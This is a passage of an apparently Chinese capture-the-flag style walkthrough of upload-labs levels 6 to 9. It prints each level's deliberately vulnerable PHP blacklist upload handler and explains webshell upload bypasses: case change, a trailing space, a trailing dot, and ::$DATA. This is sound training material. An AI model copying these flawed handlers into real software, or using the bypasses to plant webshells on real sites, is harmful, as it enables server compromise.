class="p">,</span><span class="s2">&#34;.pHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jsp&#34;</span><span class="p">,</span><span class="s2">&#34;.jspa&#34;</span><span class="p">,</span><span class="s2">&#34;.jspx&#34;</span><span class="p">,</span><span class="s2">&#34;.jsw&#34;</span><span class="p">,</span><span class="s2">&#34;.jsv&#34;</span><span class="p">,</span><span class="s2">&#34;.jspf&#34;</span><span class="p">,</span><span class="s2">&#34;.jtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jSp&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpa&#34;</span><span class="p">,</span><span class="s2">&#34;.jSw&#34;</span><span class="p">,</span><span class="s2">&#34;.jSv&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpf&#34;</span><span class="p">,</span><span class="s2">&#34;.jHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.asp&#34;</span><span class="p">,</span><span class="s2">&#34;.aspx&#34;</span><span class="p">,</span><span class="s2">&#34;.asa&#34;</span><span class="p">,</span><span class="s2">&#34;.asax&#34;</span><span class="p">,</span><span class="s2">&#34;.ascx&#34;</span><span class="p">,</span><span class="s2">&#34;.ashx&#34;</span><span class="p">,</span><span class="s2">&#34;.asmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cer&#34;</span><span class="p">,</span><span class="s2">&#34;.aSp&#34;</span><span class="p">,</span><span class="s2">&#34;.aSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSa&#34;</span><span class="p">,</span><span class="s2">&#34;.aSax&#34;</span><span class="p">,</span><span class="s2">&#34;.aScx&#34;</span><span class="p">,</span><span class="s2">&#34;.aShx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cEr&#34;</span><span class="p">,</span><span class="s2">&#34;.sWf&#34;</span><span class="p">,</span><span class="s2">&#34;.swf&#34;</span><span class="p">,</span><span class="s2">&#34;.htaccess&#34;</span><span class="p">,</span><span class="s2">&#34;.ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">deldot</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span><span class="c1">//删除文件名末尾的点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s1">&#39;::$DATA&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$file_ext</span><span class="p">);</span><span class="c1">//去除字符串::$DATA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//首尾去空
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;此文件类型不允许上传！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-5" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-5" class="header-mark"></a>绕过方法</h3><p>缺少大小写转换，将 <code>webshell.php</code> 改成 <code>webshell.PHP</code> 。</p>
<blockquote>
<p>Windows 系统下，对于文件名中的大小写不敏感。而这次的检测代码对大小写是敏感的，从而绕过</p>
<p>例如： webshell.php 和 webshell.PHP是一 样的，但程序的黑名单没有 <code>.PHP</code>。</p>
<p>Linux 系统下，对于文件名中的大小写敏感。</p>
</blockquote>
<p>​</p>
<h2 id="第七关空格绕过" class="headerLink">
    <a href="#%e7%ac%ac%e4%b8%83%e5%85%b3%e7%a9%ba%e6%a0%bc%e7%bb%95%e8%bf%87" class="header-mark"></a>第七关(空格绕过)</h2><h3 id="相关源码-6" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-6" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;.php&#34;</span><span class="p">,</span><span class="s2">&#34;.php5&#34;</span><span class="p">,</span><span class="s2">&#34;.php4&#34;</span><span class="p">,</span><span class="s2">&#34;.php3&#34;</span><span class="p">,</span><span class="s2">&#34;.php2&#34;</span><span class="p">,</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span><span class="s2">&#34;.htm&#34;</span><span class="p">,</span><span class="s2">&#34;.phtml&#34;</span><span class="p">,</span><span class="s2">&#34;.pht&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp5&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp4&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp3&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp2&#34;</span><span class="p">,</span><span class="s2">&#34;.Html&#34;</span><span class="p">,</span><span class="s2">&#34;.Htm&#34;</span><span class="p">,</span><span class="s2">&#34;.pHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jsp&#34;</span><span class="p">,</span><span class="s2">&#34;.jspa&#34;</span><span class="p">,</span><span class="s2">&#34;.jspx&#34;</span><span class="p">,</span><span class="s2">&#34;.jsw&#34;</span><span class="p">,</span><span class="s2">&#34;.jsv&#34;</span><span class="p">,</span><span class="s2">&#34;.jspf&#34;</span><span class="p">,</span><span class="s2">&#34;.jtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jSp&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpa&#34;</span><span class="p">,</span><span class="s2">&#34;.jSw&#34;</span><span class="p">,</span><span class="s2">&#34;.jSv&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpf&#34;</span><span class="p">,</span><span class="s2">&#34;.jHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.asp&#34;</span><span class="p">,</span><span class="s2">&#34;.aspx&#34;</span><span class="p">,</span><span class="s2">&#34;.asa&#34;</span><span class="p">,</span><span class="s2">&#34;.asax&#34;</span><span class="p">,</span><span class="s2">&#34;.ascx&#34;</span><span class="p">,</span><span class="s2">&#34;.ashx&#34;</span><span class="p">,</span><span class="s2">&#34;.asmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cer&#34;</span><span class="p">,</span><span class="s2">&#34;.aSp&#34;</span><span class="p">,</span><span class="s2">&#34;.aSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSa&#34;</span><span class="p">,</span><span class="s2">&#34;.aSax&#34;</span><span class="p">,</span><span class="s2">&#34;.aScx&#34;</span><span class="p">,</span><span class="s2">&#34;.aShx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cEr&#34;</span><span class="p">,</span><span class="s2">&#34;.sWf&#34;</span><span class="p">,</span><span class="s2">&#34;.swf&#34;</span><span class="p">,</span><span class="s2">&#34;.htaccess&#34;</span><span class="p">,</span><span class="s2">&#34;.ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">deldot</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">);</span><span class="c1">//删除文件名末尾的点
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//转换为小写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s1">&#39;::$DATA&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$file_ext</span><span class="p">);</span><span class="c1">//去除字符串::$DATA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nx">date</span><span class="p">(</span><span class="s2">&#34;YmdHis&#34;</span><span class="p">)</span><span class="o">.</span><span class="nx">rand</span><span class="p">(</span><span class="mi">1000</span><span class="p">,</span><span class="mi">9999</span><span class="p">)</span><span class="o">.</span><span class="nv">$file_ext</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span><span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;此文件不允许上传&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-6" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-6" class="header-mark"></a>绕过方法</h3><p>对上传的文件名未做去空格的操作。</p>
<p>上传 <code>Webshell.php</code> ，BurpSuite 抓包，在文件拓展名最后加上空格。</p>
<blockquote>
<p>Windows 系统下，对于文件名中空格会被作为空处理，但程序中的检测代码却不能自动删除 空格。从而绕过黑名单。</p>
</blockquote>
<p>​</p>
<h2 id="第八关号绕过" class="headerLink">
    <a href="#%e7%ac%ac%e5%85%ab%e5%85%b3%e5%8f%b7%e7%bb%95%e8%bf%87" class="header-mark"></a>第八关(.号绕过)</h2><h3 id="相关源码-7" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-7" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;.php&#34;</span><span class="p">,</span><span class="s2">&#34;.php5&#34;</span><span class="p">,</span><span class="s2">&#34;.php4&#34;</span><span class="p">,</span><span class="s2">&#34;.php3&#34;</span><span class="p">,</span><span class="s2">&#34;.php2&#34;</span><span class="p">,</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span><span class="s2">&#34;.htm&#34;</span><span class="p">,</span><span class="s2">&#34;.phtml&#34;</span><span class="p">,</span><span class="s2">&#34;.pht&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp5&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp4&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp3&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp2&#34;</span><span class="p">,</span><span class="s2">&#34;.Html&#34;</span><span class="p">,</span><span class="s2">&#34;.Htm&#34;</span><span class="p">,</span><span class="s2">&#34;.pHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jsp&#34;</span><span class="p">,</span><span class="s2">&#34;.jspa&#34;</span><span class="p">,</span><span class="s2">&#34;.jspx&#34;</span><span class="p">,</span><span class="s2">&#34;.jsw&#34;</span><span class="p">,</span><span class="s2">&#34;.jsv&#34;</span><span class="p">,</span><span class="s2">&#34;.jspf&#34;</span><span class="p">,</span><span class="s2">&#34;.jtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jSp&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpa&#34;</span><span class="p">,</span><span class="s2">&#34;.jSw&#34;</span><span class="p">,</span><span class="s2">&#34;.jSv&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpf&#34;</span><span class="p">,</span><span class="s2">&#34;.jHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.asp&#34;</span><span class="p">,</span><span class="s2">&#34;.aspx&#34;</span><span class="p">,</span><span class="s2">&#34;.asa&#34;</span><span class="p">,</span><span class="s2">&#34;.asax&#34;</span><span class="p">,</span><span class="s2">&#34;.ascx&#34;</span><span class="p">,</span><span class="s2">&#34;.ashx&#34;</span><span class="p">,</span><span class="s2">&#34;.asmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cer&#34;</span><span class="p">,</span><span class="s2">&#34;.aSp&#34;</span><span class="p">,</span><span class="s2">&#34;.aSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSa&#34;</span><span class="p">,</span><span class="s2">&#34;.aSax&#34;</span><span class="p">,</span><span class="s2">&#34;.aScx&#34;</span><span class="p">,</span><span class="s2">&#34;.aShx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cEr&#34;</span><span class="p">,</span><span class="s2">&#34;.sWf&#34;</span><span class="p">,</span><span class="s2">&#34;.swf&#34;</span><span class="p">,</span><span class="s2">&#34;.htaccess&#34;</span><span class="p">,</span><span class="s2">&#34;.ini&#34;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strrchr</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="s1">&#39;.&#39;</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">strtolower</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//转换为小写
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">str_ireplace</span><span class="p">(</span><span class="s1">&#39;::$DATA&#39;</span><span class="p">,</span> <span class="s1">&#39;&#39;</span><span class="p">,</span> <span class="nv">$file_ext</span><span class="p">);</span><span class="c1">//去除字符串::$DATA
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">trim</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">);</span> <span class="c1">//首尾去空
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;upload_file&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span><span class="o">.</span><span class="s1">&#39;/&#39;</span><span class="o">.</span><span class="nv">$file_name</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;上传出错！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;此文件类型不允许上传！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;文件夹不存在,请手工创建！&#39;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span></code></pre></td></tr></table>
</div>
</div><h3 id="绕过方法-7" class="headerLink">
    <a href="#%e7%bb%95%e8%bf%87%e6%96%b9%e6%b3%95-7" class="header-mark"></a>绕过方法</h3><p>Windows 系统下，文件后缀名最后一个点会被自动去除，但是这关的代码没有处理文件后缀名最后一个点，所以可以重命名为<code>Webshell.php.</code>来绕过检测。</p>
<p>​</p>
<h2 id="第九关data绕过" class="headerLink">
    <a href="#%e7%ac%ac%e4%b9%9d%e5%85%b3data%e7%bb%95%e8%bf%87" class="header-mark"></a>第九关(::$DATA绕过)</h2><h3 id="相关源码-8" class="headerLink">
    <a href="#%e7%9b%b8%e5%85%b3%e6%ba%90%e7%a0%81-8" class="header-mark"></a>相关源码</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span>
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;.php&#34;</span><span class="p">,</span><span class="s2">&#34;.php5&#34;</span><span class="p">,</span><span class="s2">&#34;.php4&#34;</span><span class="p">,</span><span class="s2">&#34;.php3&#34;</span><span class="p">,</span><span class="s2">&#34;.php2&#34;</span><span class="p">,</span><span class="s2">&#34;.html&#34;</span><span class="p">,</span><span class="s2">&#34;.htm&#34;</span><span class="p">,</span><span class="s2">&#34;.phtml&#34;</span><span class="p">,</span><span class="s2">&#34;.pht&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp5&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp4&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp3&#34;</span><span class="p">,</span><span class="s2">&#34;.pHp2&#34;</span><span class="p">,</span><span class="s2">&#34;.Html&#34;</span><span class="p">,</span><span class="s2">&#34;.Htm&#34;</span><span class="p">,</span><span class="s2">&#34;.pHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jsp&#34;</span><span class="p">,</span><span class="s2">&#34;.jspa&#34;</span><span class="p">,</span><span class="s2">&#34;.jspx&#34;</span><span class="p">,</span><span class="s2">&#34;.jsw&#34;</span><span class="p">,</span><span class="s2">&#34;.jsv&#34;</span><span class="p">,</span><span class="s2">&#34;.jspf&#34;</span><span class="p">,</span><span class="s2">&#34;.jtml&#34;</span><span class="p">,</span><span class="s2">&#34;.jSp&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpa&#34;</span><span class="p">,</span><span class="s2">&#34;.jSw&#34;</span><span class="p">,</span><span class="s2">&#34;.jSv&#34;</span><span class="p">,</span><span class="s2">&#34;.jSpf&#34;</span><span class="p">,</span><span class="s2">&#34;.jHtml&#34;</span><span class="p">,</span><span class="s2">&#34;.asp&#34;</span><span class="p">,</span><span class="s2">&#34;.aspx&#34;</span><span class="p">,</span><span class="s2">&#34;.asa&#34;</span><span class="p">,</span><span class="s2">&#34;.asax&#34;</span><span class="p">,</span><span class="s2">&#34;.ascx&#34;</span><span class="p">,</span><span class="s2">&#34;.ashx&#34;</span><span class="p">,</span><span class="s2">&#34;.asmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cer&#34;</span><span class="p">,</span><span class="s2">&#34;.aSp&#34;</span><span class="p">,</span><span class="s2">&#34;.aSpx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSa&#34;</span><span class="p">,</span><span class="s2">&#34;.aSax&#34;</span><span class="p">,</span><span class="s2">&#34;.aScx&#34;</span><span class="p">,</span><span class="s2">&#34;.aShx&#34;</span><span class="p">,</span><span class="s2">&#34;.aSmx&#34;</span><span class="p">,</span><span class="s2">&#34;.cEr&#34;</span><span class="p">,</span><span class="s2">&#34;.sWf&#34;</span><span class="p">,</span><span class="s2">&#34;.swf&#34;</span><span class="p">,</span><span class="s2">&#34;.htaccess&#34;</span><span 